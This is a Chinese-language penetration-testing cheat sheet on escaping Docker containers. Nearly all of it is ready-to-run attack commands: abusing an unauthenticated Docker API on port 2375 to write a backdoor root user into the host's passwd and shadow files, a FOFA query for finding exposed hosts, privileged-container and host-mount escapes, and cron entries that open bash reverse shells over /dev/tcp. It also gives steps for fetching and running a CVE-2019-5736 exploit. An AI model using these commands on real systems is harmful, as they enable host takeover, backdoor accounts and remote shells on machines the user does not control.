## 基础命令

```cmd
docker exec -it 容器别名 /bin/bash     #进入容器
 ls -la /.dockerenv     #判断是否在docker容器内
 cat /proc/1/cgroup     #查看进程信息以判断是否在容器内
```

## 配置不当引起逃逸

#### docker remote API未授权

```shell
判断
是否开放2375端口

---API命令-列出容器信息
curl http://your ip:2375/containers/json 
---payload，返回容器id    #修改ip
curl -H "Content-Type: application/json" -d '{"Image": "alpine:latest", "Volumes":{"/":  {"bind": "/tmp/", "mode": "rw"}},"Cmd": ["echo","nginx:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0::/root/:/bin/bash >>/tmp/etc/passwd","nginx:$1$123$7mft0jKnzzvAdU4t0unTG1::0:99999:7::: >>/tmp/etc/shadow"]}' -X POST http://192.168.88.1:2375/containers/create 
 #openssl passwd -salt '123' -1 123456
 #创建了nginx用户 密码 123456    $1$123$7mft0jKnzzvAdU4t0unTG1
---修改id
curl -X POST http://192.168.6.29:2375/containers/adff00412d20f072916072b19ba8e0f7e3fd5517ad1c44f15f6439ee404ac870/start
---使用高权限用户登录
ssh nginx@20.16.68.229   #输三次密码
```

```
fofa语句
port="2375" && "docker"

---poc
http://20.16.68.229:2375/containers/json
```

#### 挂载docker.sock

```
--- docker内安装docker
apt-get update
# 安装依赖包
apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common
# 添加 Docker 的官方 GPG 密钥
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
# 验证您现在是否拥有带有指纹的密钥
apt-key fingerprint 0EBFCD88
# 设置稳定版仓库
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
# 更新
apt-get update
# 安装最新的Docker-ce 
apt-get install docker-ce
# 启动
systemctl enable docker
systemctl start docker
 
---挂在根目录到容器内的容器
docker run -it -v /:/uzju ubuntu:18.04 /bin/bash
chroot uzju 

---更改计划任务反弹shell
crontab -e  

* * * * * /bin/bash -i >& /dev/tcp/192.168.101.48/5656 0>&1 
```

#### docker特权容器逃逸

```
---特权模式运行容器
docker run -it --privileged ubuntu:18.04 
---查看当前容器是否是特权容器（返回0000003fffffffff）
cat /proc/1/status | grep Cap 
---在容器内查看磁盘文件
fdisk -l 
---直接挂载宿主机的磁盘
mkdir xszx 
mount /dev/sda5 xszx/    # 根据fdisk -l  获取是sda5
chroot /xszx
---查看宿主机的/etc/passwd
cat /etc/passwd 
---计划任务反弹shell
crontab -e 
* * * * * /bin/bash -i >& /dev/tcp/192.168.101.48/12345 0>&1 
crontab -l
# 或者一条命令    注意centos的计划任务跟这个路径是不一样的
echo '* * * * * /bin/bash -i >& /dev/tcp/192.168.101.48/12345 0>&1' >> /var/spool/cron/crontabs/root
```

#### 挂载宿主根目录

```
docker run -it -v /:/uzju/ ubuntu:18.04
chroot uzju 
---计划任务反弹shell
crontab -e 
* * * * * /bin/bash -i >& /dev/tcp/192.168.6.68/12347 0>&1 
```

## CVE-2019-5736

```
影响版本
docker version <=18.09.2 
RunC version <=1.0-rc6
```

```
---编译exp
set GOARCH=amd64
set GOOS=linux
go build main.go

# 完后记得改回来
set GOOS=windows
---开启http服务 编译好上传到docker内
wget http://192.168.6.68:8000/main
---docker内运行
docker exec -it 88d0cbca8e4b /bin/sh
nc -lvnp 5656    #监听
./main   #运行exp
---等管理员进入容器触发，以反弹shell
docker exec -it 88d0cbca8e4b /bin/bash
```

